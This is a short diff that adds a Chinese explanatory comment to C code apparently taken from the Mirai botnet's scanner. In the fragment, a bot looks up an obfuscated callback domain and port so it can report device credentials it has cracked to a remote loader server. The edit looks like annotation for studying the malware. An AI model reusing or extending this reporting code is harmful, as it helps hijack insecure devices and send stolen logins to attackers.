@@ -920,7 +920,7 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     table_unlock_val(TABLE_SCAN_CB_DOMAIN);
     table_unlock_val(TABLE_SCAN_CB_PORT);
 
-    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
+    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));//找到loader的地址
     if (entries == NULL)
     {
 #ifdef DEBUG
